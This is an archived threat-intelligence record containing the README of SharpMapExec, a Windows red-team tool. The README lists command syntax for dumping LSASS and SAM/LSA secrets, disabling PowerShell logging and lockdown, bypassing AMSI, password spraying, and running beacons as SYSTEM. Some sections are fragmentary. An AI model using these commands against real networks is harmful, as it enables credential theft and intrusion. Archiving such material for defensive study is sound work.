{
    "id": "0e82eeac-d2ed-4806-a4c1-72aa17c28807",
    "created_at": "2023-01-12T15:04:40.974758Z",
    "updated_at": "2025-03-27T02:05:45.01105Z",
    "deleted_at": null,
    "sha1_hash": "7b06727a3caa745db2ea9fea02aa01c7d83e2fb6",
    "title": "2021-11-17 - GitHub - cube0x0 - SharpMapExec",
    "authors": "",
    "file_creation_date": "2022-05-27T23:02:13Z",
    "file_modification_date": "2022-05-27T23:02:13Z",
    "file_size": 2025832,
    "plain_text": "# SharpMapExec\n\n**github.com/cube0x0/SharpMapExec**\n\ncube0x0\n\n### A sharpen version of CrackMapExec. This tool is made to simplify penetration testing of networks and to create a swiss army knife that is made for running on Windows which is often a requirement during insider threat simulation engagements.\n\n Besides scanning for access it can be used to identify vulnerable configurations and exfiltrate data. The idea for the data exfiltration modules is to execute the least amount of necessary code on the remote computer. To accomplish this, the tool will download all the secrets to the loot directory and parse them locally.\n\n You can specify if you want to use Kerberos or NTLM authentication. If you choose Kerberos, the tool will create a sacrificial token and use Rubeus to import/ask for the ticket. If NTLM is specified, the tool will use SharpKatz SetThreadToken or LogonUser impersonation.\n\n\n-----\n\n```\nSharpMapExec.exe\n usage:\n  --- Cim --    Need plaintext password or the /impersonate flag\n    SharpMapExec.exe ntlm cim /user:USER /password:PASSWORD /computername:TARGET\n    Available Cim modules\n     /m:enable_winrm               (Runs Enable-PSRemoting -Force)\n     /m:disable_winrm              (Runs Disable-PSRemoting Force)\n     /m:disable_pslockdown            (Modify __PSLockdownPolicy\nregistry to disable CLM)\n     /m:disable_pslogging            (Modify registry to disable\nPowerShell Logging)\n     /m:check_pslockdown             (Check __PSLockdownPolicy\nregistry)\n     /m:check_pslogging             (Check PowerShell Logging\nregistry)\n  --- Reg32 --    SharpMapExec.exe ntlm reg32 /user:USER /ntlm:HASH /computername:TARGET\n    SharpMapExec.exe kerberos reg32 </user:USER /password:PASSWORD /domain:DOMAIN\n/dc:DC | /ticket:TICKET.Kirbi> /computername:TARGET\n    Reg32 modules\n     /m:disable_pslockdown            (Modify __PSLockdownPolicy\nregistry to disable CLM)\n     /m:check_pslockdown             (Check __PSLockdownPolicy\nregistry)\n     /m:check_pslogging             (Check PowerShell Logging\nregistry)\n  --- Smb --    SharpMapExec.exe ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN\n/computername:TARGET\n    SharpMapExec.exe kerberos smb </user:USER /password:PASSWORD /domain:DOMAIN\n/dc:DC | /ticket:TICKET.Kirbi> /computername:TARGET\n    Smb modules\n     /m:shares                  (Scan for accessible Smb\nshares)\n  --- WinRm --    SharpMapExec.exe ntlm winrm /user:USER /password:PASSWORD /domain:DOMAIN\n/computername:TARGET\n    SharpMapExec.exe kerberos winrm </user:USER /rc4:HASH /domain:DOMAIN /dc:DC\n| /ticket:TICKET.Kirbi> /computername:TARGET\n    WinRm modules\n     /m:exec /a:whoami              (Invoke-Command)\n     /m:exec /a:C:\\beacon.exe /system      (Invoke-Command as System)\n     /m:comsvcs                 (Dump & parse lsass)\n     /m:secrets                 (Dump and Parse Sam, Lsa, and\nSystem Dpapi blobs)\n\n```\n\n-----\n\n```\n     /m:assembly /p:Rubeus.exe /a:dump      (Execute local C# assembly in\nmemory)\n     /m:assembly /p:beacon.exe /system      (Execute local C# assembly as\nSystem in memory)\n     /m:assembly /p:getMailBox.exe /delegwalk  (Execute local C# assembly in\nall unique delegation processes in memory)\n     /m:download /path:C:\\file /destination:file (Download file from host)\n     /m:upload  /path:C:\\file /destination:file (Upload file to host)\n  --- Domain --    SharpMapExec.exe kerbspray /users:USERS.TXT /passwords:PASSWORDS.TXT\n/domain:DOMAIN /dc:DC\n    SharpMapExec.exe tgtdeleg\n  --- Ldap --    SharpMapExec.exe ntlm domain /user:USER /password:PASSWORD /domain:DOMAIN\n/dc:DC /m:MODULE\n    SharpMapExec.exe kerberos ldap </user:USER /password:PASSWORD /domain:DOMAIN\n/dc:DC /m:MODULE | /ticket:TICKET.Kirbi>\n    Ldap modules\n     /m:spraydata                (Download user and password\npolicy)\n\n## Smb\n\n### Can be used to scan for admin access, accessible Smb shares, Smb version and relay signing.\n/m:shares                 (Scan enumerated shares for access)\n\n## WinRm\n\n### The beast. It has built-in Amsi bypass, JEA language breakout, JEA function analysis. Can be used for code execution, scaning for PsRemote access, vulnerable JEA endpoints, and data exfiltration.\n/m:exec /a:whoami              (Invoke-Command)\n/m:exec /a:C:\\beacon.exe /system      (Invoke-Command as System)\n/m:comsvcs                 (Dump Lsass Process)\n/m:secrets                 (Dump and Parse Sam, Lsa, and System\nDpapi blobs)\n/m:assembly /p:Rubeus.exe /a:dump      (Execute Local C# Assembly in memory)\n/m:assembly /p:beacon.exe /system      (Execute Local C# Assembly as System in\nmemory)\n/m:download /path:C:\\file /destination:file (Download File from Host)\n\n## Domain\n\n### Currently supports domain password spraying and to create a TGT for the current user that can be used with the /ticket parameter to get the current context.\n\n```\n\n-----\n\n## Ldap\n\n### Download necessary data before pw spraying\n```\n/m:spraydata                (Download user and password policy)\n\n## Example usage\n\n### For easy or mass in-memory execution of C# assemblies\n\n Kerberos password spraying then scanning for local admin access\n\n```\n\n-----\n\n### This project supports scanning JEA endpoints and will analyze source code of non default commands and check if the endpoint was not configured for no-language mode.\n\n Discover local admin password reuse with an NT hash.\n\n\n-----\n\n### Mass dump Lsass process with built-in Microsoft signed DLL and saves it to the loot folder\n\n Executes in all delegation processes sorted by unique by users\n\n\n-----\n\n### Scan for SMB signing and SMBv1\n\n And much more!\n\n Some scenarios with Kerberos will require you to sync your clock with the DC and set the DNS\n```\nnet time \\\\DC01.hackit.local /set\nGet-NetAdapter ethernet0* | Set-DnsClientServerAddress -ServerAddresses\n@('192.168.1.10')\n\n## Acknowledgments\n\n### Projects that helped or are existing in this tool\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-11-17 - GitHub - cube0x0 - SharpMapExec.pdf"
    ],
    "report_names": [
        "2021-11-17 - GitHub - cube0x0 - SharpMapExec.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535880,
    "ts_updated_at": 1743041145,
    "ts_creation_date": 1653692533,
    "ts_modification_date": 1653692533,
    "files": {
        "pdf": "https://archive.orkl.eu/7b06727a3caa745db2ea9fea02aa01c7d83e2fb6.pdf",
        "text": "https://archive.orkl.eu/7b06727a3caa745db2ea9fea02aa01c7d83e2fb6.txt",
        "img": "https://archive.orkl.eu/7b06727a3caa745db2ea9fea02aa01c7d83e2fb6.jpg"
    }
}